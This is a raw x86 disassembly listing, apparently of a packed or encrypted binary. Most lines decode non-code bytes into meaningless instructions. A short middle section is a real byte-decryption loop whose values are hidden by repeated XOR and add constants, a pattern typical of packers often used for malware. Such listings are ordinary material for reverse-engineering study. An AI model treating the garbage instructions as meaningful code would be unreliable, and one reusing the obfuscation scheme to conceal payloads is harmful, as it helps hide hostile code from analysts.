  4285de:	retf   
  4285df:	loope  0x4285d9
  4285e1:	rol    edi,0xd4
  4285e4:	(bad)  
  4285e5:	repnz shr ecx,0xf6
  4285e9:	(bad)  
  4285ea:	(bad)  
  4285eb:	aad    0xdc
  4285ed:	in     eax,0xdd
  4285ef:	fdiv   st,st(2)
  4285f1:	(bad)  
  4285f2:	into   
  4285f3:	lods   al,BYTE PTR ds:[esi]
  4285f4:	lods   al,BYTE PTR ds:[esi]
  4285f5:	mov    bh,0xda
  4285f7:	mov    bh,0xd4
  4285f9:	mov    dh,0xf0
  4285fb:	enter  0xbebf,0xf0
  4285ff:	std    
  428600:	mov    ebx,0xd8edd2d3
  428605:	(bad)  
  428607:	fcmovnb st,st(3)
  428609:	or     ch,bh
  42860b:	mov    edi,0xe80f00dd
  428611:	lock call 0xc60d5aea
  428617:	shl    eax,0xc6
  42861a:	dec    al
  42861c:	into   
  42861d:	clc    
  42861e:	fstp   st(0)
  428620:	iret   
  428621:	cld    
  428622:	mov    esi,0xcbd403e1
  428627:	loopne 0x42861d
  428629:	fsub   st(6),st
  42862b:	enter  0xe7c8,0x5
  42862f:	out    0xf3,al
  428631:	mov    cl,0xe9
  428633:	(bad)  
  428634:	loope  0x428601
  428636:	out    0xe6,eax
  428638:	in     eax,dx
  428639:	jmp    0x42860e
  42863b:	aad    0xd2
  42863d:	lock shl al,1
  428640:	mov    bh,0xf5
  428642:	cli    
  428643:	icebp  
  428644:	repz (bad) 
  428647:	fadd   st(5),st
  428649:	jmp    0xd93e472e
  42864e:	loopne 0x428629
  428650:	out    dx,eax
  428651:	loope  0x4285fc
  428653:	fucomp st(3)
  428655:	out    dx,eax
  428656:	loope  0x42863f
  428658:	leave  
  428659:	mov    bh,0xce
  42865b:	mov    eax,0xd1efd8e5
  428660:	call   0xfb214e54
  428665:	rcr    dl,cl
  428667:	lock loop 0x428672
  42866a:	rol    al,0xcb
  42866d:	out    dx,al
  42866e:	in     eax,dx
  42866f:	fdivr  QWORD PTR [ecx-0x1b0d4137]
  428675:	sar    edx,0xd6
  428678:	test   dl,0xda
  42867b:	mov    ecx,0xcfd3cef4
  428680:	(bad)  
  428681:	mov    edi,0xddd8d002
  428686:	in     eax,0xb
  428688:	retf   
  428689:	or     edi,edi
  42868b:	loopne 0x428672
  42868d:	into   
  42868e:	clc    
  42868f:	iret   
  428690:	into   
  428691:	mov    ebp,0xf4f2efdf
  428696:	mov    ah,0xec
  428698:	mov    ch,0xb8
  42869a:	shl    BYTE PTR [eax-0x2c124038],cl
  4286a0:	idiv   esp
  4286a2:	aad    0xd2
  4286a4:	add    esi,eax
  4286a6:	(bad)  
  4286a8:	rol    DWORD PTR [eax],1
  4286aa:	add    ecx,DWORD PTR [ebx]
  4286ac:	paddd  mm1,QWORD PTR [eax]
  4286af:	adc    cl,ah
  4286b1:	(bad)
  4286b4:	enter  0xc7ee,0xe6
  4286b8:	mul    al
  4286ba:	out    dx,al
  4286bb:	in     al,dx
  4286bc:	jmp    0xf7b8:0x3f6d4cb
  4286c3:	rcr    esi,1
  4286c5:	(bad)  
  4286c6:	mov    ebp,0xf4e0db0a
  4286cb:	(bad)  
  4286cd:	int3   
  4286ce:	loopne 0x4286e2
  4286d0:	repz mov edi,0xeaedaef3
  4286d6:	mov    bh,0xbb
  4286d8:	rcl    ebp,0xb5
  4286db:	aam    0xb6
  4286dd:	iret   
  4286de:	(bad)  
  4286e0:	fyl2xp1 
  4286e2:	in     eax,dx
  4286e3:	fiadd  DWORD PTR [esi]
  4286e5:	mov    ebp,0xebcaebd2
  4286ea:	jmp    0x4286fa
  4286ec:	iret   
  4286ed:	fucomp st(5)
  4286ef:	jecxz  0x4286e2
  4286f1:	fdiv   QWORD PTR [ecx-0x10530e0f]
  4286f7:	mov    cl,0xb6
  4286f9:	fcmovb st,st(5)
  4286fb:	mov    ch,0xde
  4286fd:	stc    
  4286fe:	hlt    
  4286ff:	int3   
  428700:	(bad)  
  428701:	in     eax,dx
  428702:	fidivr DWORD PTR [ebp-0x3c281bfe]
  428708:	fcmovnu st,st(0)
  42870a:	loope  0x4286d5
  42870c:	add    ebp,edi
  42870e:	call   0xef207717
  428713:	jmp    0xe62659e4
  428718:	aad    0xf4
  42871a:	rcr    al,1
  42871c:	hlt    
  42871d:	jecxz  0x428707
  42871f:	in     al,dx
  428720:	jmp    ebx
  428722:	cld    
  428723:	icebp  
  428724:	in     eax,dx
  428725:	jmp    0x42870a
  428727:	xlat   BYTE PTR ds:[ebx]
  428728:	fsubp  st(0),st
  42872a:	out    0xa,al
  42872c:	(bad)  [eax]
  42872e:	leave  
  42872f:	loop   0x4286fb
  428731:	int    0xd7
  428733:	loope  0x428729
  428735:	loop   0x428722
  428737:	mov    bl,0xd7
  428739:	repz fcmovne st,st(1)
  42873c:	leave  
  42873d:	(bad)  
  42873e:	ffreep st(3)
  428740:	rol    edx,1
  428742:	sar    ebx,1
  428744:	neg    ah
  428746:	mov    ecx,0xac6c6d9
  42874b:	iret   
  42874c:	bswap  ecx
  42874e:	out    dx,al
  42874f:	iret   
  428750:	test   eax,0xe8cff3ad
  428755:	out    dx,al
  428756:	hlt    
  428757:	jmp    0xd11b514f
  42875c:	iret   
  42875d:	mov    dl,0xdf
  42875f:	ret    
  428760:	cmc    
  428761:	sar    DWORD PTR [edi+0xbd2c0ed],1
  428767:	mul    dl
  428769:	fsubrp st(3),st
  42876b:	add    DWORD PTR ds:0xe3fce6d4,eax
  428771:	shl    ebx,1
  428773:	fnsave [esi-0x3b3d4a1f]
  428779:	mov    ecx,0xfdfbfff8
  42877e:	aam    0xef
  428780:	rcl    ebx,1
  428782:	cli    
  428783:	loopne 0x428740
  428785:	(bad)
  428788:	(bad)  
  428789:	(bad)  
  42878a:	jmp    0x42877b
  42878c:	add    ah,bl
  42878e:	out    dx,eax
  42878f:	loopne 0x428780
  428791:	iret   
  428792:	leave  
  428793:	mov    esi,0xf4bbd0e2
  428798:	mov    ebx,0xcedaefd9
  42879d:	(bad)  
  42879f:	fcmovnbe st,st(2)
  4287a1:	repz std 
  4287a3:	(bad)  
  4287a4:	cld    
  4287a5:	in     al,dx
  4287a6:	loopne 0x42877c
  4287a8:	add    dh,bh
  4287aa:	(bad)  
  4287ab:	mov    DWORD PTR [edi],0xdee105ef
  4287b1:	(bad)
  4287b4:	div    dl
  4287b6:	mov    dl,0xb6
  4287b8:	int3   
  4287b9:	out    0xf6,eax
  4287bb:	(bad)
  4287bf:	(bad)  
  4287c1:	add    bl,dh
  4287c3:	mov    ah,0xdc
  4287c5:	loop   0x42879d
  4287c7:	or     esp,edi
  4287c9:	push   es
  4287ca:	hlt    
  4287cb:	or     bl,bh
  4287cd:	or     ebx,edx
  4287cf:	add    edx,esp
  4287d1:	call   0xf40430a9
  4287d6:	iret   
  4287d7:	fldz   
  4287d9:	jmp    0x42878b
  4287db:	icebp  
  4287dc:	mov    esi,0xfebfb4cf
  4287e1:	rol    ebx,0xf2
  4287e4:	sar    dl,1
  4287e6:	(bad)  
  4287e7:	fld    st(7)
  4287e9:	retf   
  4287ea:	mov    ebp,0x90605f5
  4287ef:	in     al,dx
  4287f0:	stos   BYTE PTR es:[edi],al
  4287f1:	test   eax,0xb7e7d5e5
  4287f6:	test   eax,0xf1b2d6eb
  4287fb:	fdivr  st,st(6)
  4287fd:	mov    ebp,0xeecceeb5
  428802:	icebp  
  428803:	not    bl
  428805:	std    
  428806:	(bad)  
  428807:	jmp    0x428802
  428809:	add    BYTE PTR [ecx],al
  42880b:	leave  
  42880c:	or     eax,0xf2cf0cdd
  428811:	int3   
  428812:	loop   0x4287b8
  428814:	ret    
  428815:	fsub   st(1),st
  428817:	mov    edx,0xded8efc8
  42881c:	(bad)  
  42881d:	in     al,0xc9
  42881f:	fcmovbe st,st(4)
  428821:	mov    edx,0xd6edf7fd
  428826:	add    edi,esp
  428828:	loope  0x428823
  42882a:	(bad)  
  42882c:	out    0x0,al
  42882e:	(bad)  
  428830:	jmp    0xede2:0xd5b7afeb
  428837:	xlat   BYTE PTR ds:[ebx]
  428838:	in     eax,0xfa
  42883a:	not    ch
  42883c:	repnz retf 
  42883e:	mov    ch,0xe9
  428840:	in     eax,dx
  428841:	(bad)  
  428842:	(bad)  
  428844:	(bad)  
  428846:	(bad)  
  428848:	aad    0xc2
  42884a:	retf   
  42884b:	(bad)  [edi]
  42884d:	add    ah,cl
  42884f:	in     al,0xc5
  428851:	scas   al,BYTE PTR es:[edi]
  428852:	fsubp  st(4),st
  428854:	lods   eax,DWORD PTR ds:[esi]
  428855:	mov    cl,0xd1
  428857:	out    dx,eax
  428858:	iret   
  428859:	cli    
  42885a:	(bad)  
  42885b:	in     eax,0xdc
  42885d:	jmp    0xdc3b432b
  428862:	icebp  
  428863:	(bad)  
  428864:	in     al,dx
  428865:	repz jmp 0xcbd4:0xddc9e9fc
  42886d:	les    ecx,FWORD PTR [edi]
  42886f:	pmulhuw mm5,QWORD PTR [edx-0x53124929]
  428876:	vpminub ymm6,ymm1,ymm3
  42887b:	mov    ah,0xbd
  42887d:	iret   
  42887e:	mov    esp,0xc2c0fbdb
  428883:	sar    edi,1
  428885:	stc    
  428886:	out    0xf4,al
  428888:	pop    es
  428889:	push   es
  42888a:	xlat   BYTE PTR ds:[ebx]
  42888b:	add    BYTE PTR [ecx],cl
  42888d:	(bad)  
  42888e:	fucomip st,st(7)
  428890:	lods   al,BYTE PTR ds:[esi]
  428891:	leave  
  428892:	int3   
  428893:	loope  0x428865
  428895:	mul    esi
  428897:	icebp  
  428898:	in     al,dx
  428899:	mov    dl,0xcb
  42889b:	(bad)  
  42889d:	test   al,0xe1
  4288a0:	icebp  
  4288a1:	out    0xd3,eax
  4288a3:	cmc    
  4288a4:	fcmovnu st,st(1)
  4288a6:	loop   0x4288b2
  4288a8:	ret    
  4288a9:	fimul  WORD PTR [esi]
  4288ab:	(bad)  
  4288ad:	cli    
  4288ae:	in     al,dx
  4288af:	in     eax,dx
  4288b0:	shl    BYTE PTR [eax-0x124e0d1c],1
  4288b6:	lods   eax,DWORD PTR ds:[esi]
  4288b7:	call   0xb71b3e91
  4288bc:	mov    ebx,0xc2d4baf6
  4288c1:	std    
  4288c2:	push   es
  4288c3:	in     eax,0xfc
  4288c5:	mov    ecx,0x3c1e1b8
  4288cb:	or     eax,0xfde2cdde
  4288d0:	fdiv   DWORD PTR [ecx-0x141a573b]
  4288d6:	mov    ebx,0xebf5cdcb
  4288db:	shl    edx,1
  4288dd:	ror    ebx,cl
  4288df:	int3   
  4288e0:	fadd   st,st(2)
  4288e2:	stc    
  4288e3:	cli    
  4288e4:	mov    ebp,0xfa0bf4fd
  4288ea:	add    eax,0xcddeefd6
  4288ef:	add    BYTE PTR [ebx-0xf421e32],dh
  4288f5:	mov    bl,0xf2
  4288f7:	div    BYTE PTR [edx-0xe103852]
  4288fd:	mov    ebx,0xe0f2d4b4
  428902:	add    bh,BYTE PTR [eax-0x24fb02fb]
  428908:	loopne 0x42890f
  42890a:	jecxz  0x4288d5
  42890c:	ret    
  42890d:	retf   0xd9dc
  428910:	fmul   st(2),st
  428912:	mov    edi,0xd5f2f7d2
  428917:	xlat   BYTE PTR ds:[ebx]
  428918:	in     al,dx
  428919:	fcomp  st(6)
  42891b:	out    0xcf,al
  42891d:	fnclex 
  42891f:	test   BYTE PTR [edx],0xe2
  428922:	add    esi,edx
  428924:	push   es
  428925:	pop    es
  428926:	add    eax,edx
  428928:	add    eax,0xfbdaf704
  42892d:	loopne 0x42891d
  42892f:	cld    
  428930:	fcomp  st(5)
  428932:	loop   0x4288fe
  428934:	enter  0xb2c0,0xce
  428938:	stc    
  428939:	fld    st(6)
  42893b:	in     al,dx
  42893c:	test   ah,0xbd
  42893f:	rcl    bh,cl
  428941:	ret    0xddfd
  428944:	int    0xff
  428946:	fld    DWORD PTR [eax]
  428948:	add    ah,ah
  42894a:	cmc    
  42894b:	loop   0x428956
  42894d:	repz in eax,dx
  42894f:	(bad)  
  428950:	int    0xec
  428952:	(bad)
  428956:	mov    dl,0xb7
  428958:	repz mov eax,0xfacfdee8
  42895e:	icebp  
  42895f:	in     al,dx
  428960:	hlt    
  428961:	mov    dh,0xd9
  428963:	mul    eax
  428965:	fadd   QWORD PTR [ecx]
  428967:	(bad)  
  428969:	out    0xe7,al
  42896b:	(bad)  
  42896c:	leave  
  42896d:	(bad)  
  42896e:	std    
  42896f:	loop   0x428960
  428971:	scas   al,BYTE PTR es:[edi]
  428972:	in     al,dx
  428973:	enter  0xecdc,0xf4
  428977:	loope  0x428950
  428979:	idiv   BYTE PTR [eax-0x3c273337]
  42897f:	aad    0xe3
  428981:	sti    
  428982:	fidivr WORD PTR [esi-0x3463f13]
  428988:	or     dh,dh
  42898a:	(bad)  
  42898c:	retf   0xddec
  42898f:	cld    
  428990:	repz scas al,BYTE PTR es:[edi]
  428992:	ret    
  428993:	out    0xd3,eax
  428995:	call   0xd909567b
  42899a:	int3   
  42899b:	iret   
  42899c:	cld    
  42899d:	aam    0xd9
  42899f:	repnz lock loop 0x4289a4
  4289a3:	mov    esp,0xffeaf3d7
  4289a8:	rol    BYTE PTR [ecx],0xcf
  4289ab:	fyl2xp1 
  4289ad:	clc    
  4289ae:	or     bl,ch
  4289b0:	mov    edi,0xc2cbc7ca
  4289b5:	enter  0xa8b7,0xe1
  4289b9:	(bad)  
  4289bb:	mov    ah,0xf5
  4289bd:	shl    ch,cl
  4289bf:	cmc    
  4289c0:	fdivr  st(5),st
  4289c2:	in     eax,dx
  4289c3:	out    dx,al
  4289c4:	fdivr  st,st(4)
  4289c6:	loop   0x428989
  4289c8:	vpmullw ymm0,ymm3,ymm0
  4289cc:	fyl2xp1 
  4289ce:	out    dx,al
  4289cf:	add    al,0xcf
  4289d1:	(bad)  
  4289d2:	rol    bh,0xb5
  4289d5:	mov    cl,0xad
  4289d7:	(bad)  
  4289d8:	(bad)  
  4289d9:	(bad)  
  4289da:	out    dx,al
  4289db:	mov    eax,0xd3dbf8c9
  4289e0:	std    
  4289e1:	test   DWORD PTR [ebx],0xdcddbfd5
  4289e7:	jecxz  0x4289b4
  4289e9:	out    0xf6,al
  4289eb:	retf   0xdf06
  4289ee:	(bad)  
  4289ef:	in     al,dx
  4289f0:	rcr    esi,cl
  4289f2:	mov    al,0xb2
  4289f4:	int3   
  4289f5:	retf   
  4289f6:	repnz in eax,0xcc
  4289f9:	shl    edi,cl
  4289fb:	mov    ecx,0xf1c3b2f9
  428a00:	mov    bh,0xc1
  428a02:	xlat   BYTE PTR ds:[ebx]
  428a03:	lock icebp 
  428a05:	aad    0xd5
  428a07:	cld    
  428a08:	shl    esi,1
  428a0a:	fldl2t 
  428a0c:	jecxz  0x4289d2
  428a0e:	or     al,0xcd
  428a10:	ror    bh,cl
  428a12:	(bad)  
  428a13:	shr    bl,cl
  428a15:	loopne 0x4289e7
  428a17:	rol    edi,0xd2
  428a1a:	int    0xb8
  428a1c:	jmp    0xe2ec:0xddfdc3c9
  428a23:	ret    0xdaf7
  428a26:	std    
  428a27:	jmp    0xdd3b69eb
  428a2c:	(bad)  
  428a2d:	jmp    0x4289fb
  428a2f:	or     ch,BYTE PTR [eax-0x1637a77]
  428a35:	(bad)  
  428a36:	dec    DWORD PTR [ebp-0x1777b]
  428a3c:	dec    DWORD PTR [ecx-0x17f7b]
  428a42:	dec    DWORD PTR [ebp-0x15f7b]
  428a48:	dec    DWORD PTR [ecx-0x1737b]
  428a4e:	dec    DWORD PTR [ebx-0x1937b]
  428a54:	(bad)  
  428a55:	cmp    eax,DWORD PTR [ebp-0x164]
  428a5b:	jae    0x428c0b
  428a61:	mov    eax,DWORD PTR [ebp-0x180]
  428a67:	mov    DWORD PTR [eax],0xf89c85a5
  428a6d:	mov    eax,DWORD PTR [ebp-0x174]
  428a73:	mov    DWORD PTR [eax],0xf89c85ae
  428a79:	lea    eax,[ebp-0x185]
  428a7f:	mov    DWORD PTR [ebp-0x18c],eax
  428a85:	mov    eax,DWORD PTR [ebp-0x168]
  428a8b:	xor    eax,0x75108b5
  428a90:	add    eax,0x3272fb
  428a95:	mov    ecx,DWORD PTR [ebp-0x164]
  428a9b:	imul   ecx,eax
  428a9e:	mov    eax,DWORD PTR [ebp-0x18c]
  428aa4:	mov    edx,DWORD PTR [ebp-0x190]
  428aaa:	mov    cl,BYTE PTR [edx+ecx*1]
  428aad:	mov    BYTE PTR [eax],cl
  428aaf:	mov    eax,DWORD PTR [ebp-0x168]
  428ab5:	xor    eax,0x75108b5
  428aba:	add    eax,0x3272fb
  428abf:	mov    ecx,DWORD PTR [ebp-0x164]
  428ac5:	imul   ecx,eax
  428ac8:	mov    eax,DWORD PTR [ebp-0x170]
  428ace:	xor    eax,0x75108b5
  428ad3:	add    eax,DWORD PTR [ebp-0x190]
  428ad9:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fb]
  428ae1:	mov    ecx,DWORD PTR [ebp-0x178]
  428ae7:	xor    ecx,0x75108b5
  428aed:	lea    eax,[eax+ecx*1+0x3272fb]
  428af4:	movzx  ecx,BYTE PTR [ebp-0x185]
  428afb:	xor    ecx,eax
  428afd:	mov    BYTE PTR [ebp-0x185],cl
  428b03:	mov    al,BYTE PTR [ebp-0x185]
  428b09:	mov    ecx,DWORD PTR [ebp-0x168]
  428b0f:	xor    ecx,0x75108b5
  428b15:	add    ecx,0x3272fb
  428b1b:	mov    edx,DWORD PTR [ebp-0x164]
  428b21:	imul   edx,ecx
  428b24:	mov    ecx,DWORD PTR [ebp-0x190]
  428b2a:	mov    BYTE PTR [ecx+edx*1],al
  428b2d:	mov    eax,DWORD PTR [ebp-0x168]
  428b33:	xor    eax,0x75108b5
  428b38:	add    eax,0x3272fb
  428b3d:	mov    ecx,DWORD PTR [ebp-0x164]
  428b43:	imul   ecx,eax
  428b46:	mov    eax,DWORD PTR [ebp-0x18c]
  428b4c:	mov    edx,DWORD PTR [ebp-0x190]
  428b52:	mov    cl,BYTE PTR [edx+ecx*1]
  428b55:	mov    BYTE PTR [eax],cl
  428b57:	mov    eax,DWORD PTR [ebp-0x168]
  428b5d:	xor    eax,0x75108b5
  428b62:	add    eax,0x3272fb
  428b67:	mov    ecx,DWORD PTR [ebp-0x164]
  428b6d:	imul   ecx,eax
  428b70:	mov    eax,DWORD PTR [ebp-0x184]
  428b76:	xor    eax,0x75108b5
  428b7b:	add    eax,DWORD PTR [ebp-0x190]
  428b81:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fb]
  428b89:	mov    ecx,DWORD PTR [ebp-0x160]
  428b8f:	xor    ecx,0x75108b5
  428b95:	lea    eax,[eax+ecx*1+0x3272fb]
  428b9c:	movzx  ecx,BYTE PTR [ebp-0x185]
  428ba3:	xor    ecx,eax
  428ba5:	mov    BYTE PTR [ebp-0x185],cl
  428bab:	mov    al,BYTE PTR [ebp-0x185]
  428bb1:	mov    ecx,DWORD PTR [ebp-0x168]
  428bb7:	xor    ecx,0x75108b5
  428bbd:	add    ecx,0x3272fb
  428bc3:	mov    edx,DWORD PTR [ebp-0x164]
  428bc9:	imul   edx,ecx
  428bcc:	mov    ecx,DWORD PTR [ebp-0x190]
  428bd2:	mov    BYTE PTR [ecx+edx*1],al
  428bd5:	mov    eax,DWORD PTR [ebp-0x184]
  428bdb:	xor    eax,0x75108b5
  428be0:	add    eax,0x3272fb
  428be5:	mov    ecx,DWORD PTR [ebp-0x16c]
  428beb:	xor    ecx,0x75108b5
  428bf1:	add    ecx,0x3272fb
  428bf7:	imul   eax,ecx
  428bfa:	add    eax,DWORD PTR [ebp-0x164]
  428c00:	mov    DWORD PTR [ebp-0x164],eax
  428c06:	jmp    0x428a4f
  428c0b:	mov    eax,DWORD PTR [ebp-0x154]
  428c11:	xor    eax,0x75108b5
  428c16:	mov    ecx,DWORD PTR [ebp-0x17c]
  428c1c:	xor    ecx,0x75108b5
  428c22:	add    ecx,0x3272fb
  428c28:	mov    edx,DWORD PTR [ebp-0x194]
  428c2e:	mov    esi,DWORD PTR [ebp-0x184]
  428c34:	xor    esi,0x75108b5
  428c3a:	add    esi,0x3272fb
  428c40:	imul   esi,edx
  428c43:	or     esi,ecx
  428c45:	lea    eax,[esi+eax*1+0x3272fb]
  428c4c:	mov    ecx,DWORD PTR [ebp-0x154]
  428c52:	xor    ecx,0x75108b5
  428c58:	add    ecx,DWORD PTR [ebp-0x144]
  428c5e:	lea    eax,[ecx+eax*1+0x3272fb]
  428c65:	mov    DWORD PTR [ebp-0x144],eax
  428c6b:	jmp    0x42b034
  428c70:	mov    eax,DWORD PTR [ebp-0x154]
  428c76:	xor    eax,0x75108b5
  428c7b:	mov    ecx,DWORD PTR [ebp-0x144]
  428c81:	lea    eax,[ecx+eax*1+0x3272fb]
  428c88:	jmp    0x42b02e
  428c8d:	scas   eax,DWORD PTR es:[edi]
  428c8e:	in     al,0x37
  428c90:	dec    ebx
  428c91:	je     0x428cdb
  428c93:	mul    DWORD PTR [edx+ebx*1-0x1e]
  428c97:	imul   esi,DWORD PTR [edx+0x132e7e0],0xfffffffa
  428c9e:	lods   eax,DWORD PTR ds:[esi]
  428c9f:	jns    0x428d1c
  428ca1:	add    bl,BYTE PTR [eax-0x1e2c8485]
  428ca7:	loop   0x428c7a
  428ca9:	out    0xcb,al
  428cab:	shl    DWORD PTR [ebp-0x15363b32],0xbb
  428cb2:	in     eax,dx
  428cb3:	call   edi
  428cb5:	shr    esp,cl
  428cb7:	fld    st(1)
  428cb9:	(bad)  
  428cba:	fucomip st,st(1)
  428cbc:	jmp    0x428cc3
  428cbe:	aad    0xf5
  428cc0:	in     eax,dx
  428cc1:	fild   DWORD PTR [esi]
  428cc3:	(bad)  
  428cc4:	stos   DWORD PTR es:[edi],eax
  428cc5:	leave  
  428cc6:	(bad)
  428cc9:	int3   
  428cca:	in     al,0xcc
  428ccc:	out    0xc9,al
  428cce:	out    0xd3,eax
  428cd0:	shl    BYTE PTR [ebp-0xa1f011e],1
  428cd6:	out    dx,eax
  428cd7:	(bad)  
  428cd8:	fcomi  st,st(1)
  428cda:	test   ebp,0xe2d603eb
  428ce0:	stc    
  428ce1:	fisttp QWORD PTR [eax]
  428ce3:	iret   
  428ce4:	scas   eax,DWORD PTR es:[edi]
  428ce5:	div    esi
  428ce7:	into   
  428ce8:	mov    bh,0xc3
  428cea:	jmp    0xd8f6:0xfac8c7ba
  428cf1:	jmp    0x428cc1
  428cf3:	sti    
  428cf4:	shr    esp,0xf9
  428cf7:	in     eax,dx
  428cf8:	loop   0x428cb8
  428cfa:	add    cl,ch
  428cfc:	add    ecx,eax
  428cfe:	add    edi,edx
  428d00:	in     al,0xc8
  428d02:	int    0xcb
  428d04:	leave  
  428d05:	leave  
  428d06:	jecxz  0x428cd8
  428d08:	in     eax,dx
  428d09:	aad    0xef
  428d0b:	rcl    ch,cl
  428d0d:	clc    
  428d0e:	mov    cl,0xd8
  428d10:	mov    esi,0xbceeb4fd
  428d15:	fadd   DWORD PTR [esi]
  428d17:	clc    
  428d18:	xlat   BYTE PTR ds:[ebx]
  428d19:	ret    0x3fc
  428d1c:	loop   0x428d28
  428d1e:	in     eax,0xdb
  428d20:	jmp    0xa74d7138
  428d25:	lods   eax,DWORD PTR ds:[esi]
  428d26:	(bad)  
  428d27:	jmp    0x428d19
  428d29:	rcl    bh,1
  428d2b:	stc    
  428d2c:	leave  
  428d2d:	mov    ebx,0xcff2f2b5
  428d32:	mov    ecx,0xc3bff5fe
  428d37:	add    dl,cl
  428d39:	jmp    0x428cfc
  428d3b:	add    edi,ebx
  428d3d:	sti    
  428d3e:	add    ecx,DWORD PTR [eax]
  428d40:	or     eax,0xdcfa0708
  428d45:	repz fbld TBYTE PTR [ebp+edi*4-0x2e4a3f56]
  428d4d:	xlat   BYTE PTR ds:[ebx]
  428d4e:	int3   
  428d4f:	mov    eax,0xbcf1feec
  428d54:	mov    ebp,0xd8d6f2ce
  428d59:	sar    bh,1
  428d5b:	loop   0x428d5a
  428d5d:	(bad)  
  428d5e:	ffree  st(4)
  428d60:	retf   0xf8c5
  428d63:	shr    ch,0xd0
  428d66:	shl    ah,cl
  428d68:	jmp    0x428d14
  428d6a:	xlat   BYTE PTR ds:[ebx]
  428d6b:	in     eax,0xb2
  428d6d:	(bad)  
  428d6f:	out    dx,eax
  428d70:	jmp    0xcefd:0xdfd5ffbb
  428d77:	fstp   st(0)
  428d79:	ret    
  428d7a:	retf   
  428d7b:	add    bh,ah
  428d7d:	hlt    
  428d7e:	cmc    
  428d7f:	push   es
  428d80:	out    0x2,eax
  428d82:	(bad)  
  428d84:	(bad)  
  428d85:	scas   al,BYTE PTR es:[edi]
  428d86:	in     eax,dx
  428d87:	jecxz  0x428d79
  428d89:	mov    ch,0xc2
  428d8b:	shl    bh,cl
  428d8d:	(bad)  
  428d8e:	into   
  428d8f:	clc    
  428d90:	retf   
  428d91:	frndint 
  428d93:	mov    esi,0x1bfc8b9
  428d98:	lds    edi,FWORD PTR [ebp-0x4ff03fa]
  428d9e:	add    ebx,esp
  428da0:	or     eax,0xd2e4cf02
  428da5:	(bad)  [esi-0x372c3313]
  428dab:	into   
  428dac:	clc    
  428dad:	mov    ecx,0xf9fce4d6
  428db2:	mov    ebx,0xd0f3cdf7
  428db7:	fdivr  st,st(4)
  428db9:	sar    edx,cl
  428dbb:	fsub   st,st(4)
  428dbd:	out    dx,eax
  428dbe:	cli    
  428dbf:	or     ebp,ebp
  428dc1:	hlt    
  428dc2:	jmp    0xb7c2:0xc5e2cae3
  428dc9:	hlt    
  428dca:	int    0xb1
  428dcc:	mov    bl,0xd0
  428dce:	out    0xe6,eax
  428dd0:	enter  0xf7f3,0xb4
  428dd4:	(bad)  
  428dd5:	repnz cli 
  428dd7:	fstp   st(3)
  428dd9:	jmp    0x428de0
  428ddb:	out    0xd7,eax
  428ddd:	call   0x102f87d1
  428de2:	fmul   st(3),st
  428de4:	repz (bad) [esi+ebp*8-0x3b4a083e]
  428dec:	repz retf 
  428dee:	into   
  428def:	(bad)
  428df2:	rcl    al,cl
  428df4:	cmc    
  428df5:	iret   
  428df6:	fdivp  st(1),st
  428df8:	mov    esi,0xe2d5c7fc
  428dfd:	sti    
  428dfe:	enter  0xefb,0x1
  428e02:	fcmovu st,st(2)
  428e04:	rol    edi,cl
  428e06:	iret   
  428e07:	ror    edi,0xee
  428e0a:	sti    
  428e0b:	cmc    
  428e0c:	shr    edx,0xb9
  428e0f:	int    0xd5
  428e11:	mov    edx,0xc3e2d4ba
  428e16:	cld    
  428e17:	add    esp,esp
  428e19:	(bad)  
  428e1a:	cli    
  428e1b:	fdiv   st,st(1)
  428e1d:	(bad)
  428e20:	aam    0xe9
  428e22:	in     al,0xf1
  428e24:	ret    0xccca
  428e27:	iret   
  428e28:	loop   0x428df2
  428e2a:	shl    ecx,cl
  428e2c:	hlt    
  428e2d:	into   
  428e2e:	in     al,dx
  428e2f:	aam    0xf6
  428e31:	out    dx,eax
  428e32:	mov    ebp,0x7cedfc9
  428e37:	push   es
  428e38:	repnz mov esp,0xdf0be1f7
  428e3e:	mul    ebp
  428e40:	in     eax,0xd4
  428e42:	iret   
  428e43:	out    0xd0,al
  428e45:	mov    dl,0xdf
  428e47:	mov    dh,0xf3
  428e49:	mov    dh,0xd1
  428e4b:	mov    dl,0xcc
  428e4d:	aam    0xb6
  428e4f:	lods   al,BYTE PTR ds:[esi]
  428e50:	sar    DWORD PTR [ecx-0x2543264f],1
  428e56:	iret   
  428e57:	mov    eax,0xff07e6f0
  428e5c:	cmc    
  428e5d:	(bad)  
  428e5e:	out    dx,al
  428e5f:	push   cs
  428e60:	or     esi,esp
  428e62:	ror    ecx,cl
  428e64:	jecxz  0x428e54
  428e66:	icebp  
  428e67:	jmp    0xfac6:0xc8e3aac5
  428e6e:	out    0xb8,al
  428e70:	fcomip st,st(4)
  428e72:	jecxz  0x428e73
  428e74:	fcmove st,st(7)
  428e76:	fcmovu st,st(1)
  428e78:	shl    ebx,cl
  428e7a:	cld    
  428e7b:	(bad)  
  428e7c:	in     al,0xfb
  428e7e:	iret   
  428e7f:	or     edx,ecx
  428e81:	(bad)  
  428e83:	repnz int 0xd8
  428e86:	in     eax,0xbc
  428e88:	scas   eax,DWORD PTR es:[edi]
  428e89:	retf   
  428e8a:	enter  0xe6fa,0xe6
  428e8e:	mov    ch,0xf4
  428e90:	call   0xee308a64
  428e95:	shr    dh,0xff
  428e98:	inc    DWORD PTR [ecx]
  428e9a:	ror    BYTE PTR [edx],0x2
  428e9d:	jecxz  0x428e7c
  428e9f:	in     al,0x5
  428ea1:	cld    
  428ea2:	add    ch,ah
  428ea4:	icebp  
  428ea5:	test   eax,0xbcbdcab7
  428eaa:	ret    0xced1
  428ead:	aad    0xb4
  428eaf:	ror    dh,cl
  428eb1:	int3   
  428eb2:	mov    ch,0xf2
  428eb4:	loop   0x428eae
  428eb6:	mov    esp,0xd9fad9de
  428ebb:	jmp    0xe33d6ea8
  428ec0:	jmp    0xe3ad:0xbcce0f03
  428ec7:	(bad)  
  428ec8:	(bad)
  428ecb:	int    0xe5
  428ecd:	aad    0xff
  428ecf:	enter  0xbbcc,0xf4
  428ed3:	repz rol eax,1
  428ed6:	std    
  428ed7:	add    bl,dh
  428ed9:	(bad)  
  428edb:	(bad)  
  428edc:	hlt    
  428edd:	push   es
  428ede:	sti    
  428edf:	pop    es
  428ee0:	leave  
  428ee1:	stc    
  428ee2:	add    BYTE PTR [eax],al
  428ee4:	jecxz  0x428e8e
  428ee6:	xlat   BYTE PTR ds:[ebx]
  428ee7:	mov    esi,0xc6e5b1c2
  428eec:	(bad)  
  428eed:	rcr    edi,1
  428eef:	sti    
  428ef0:	retf   0xcbef
  428ef3:	in     al,dx
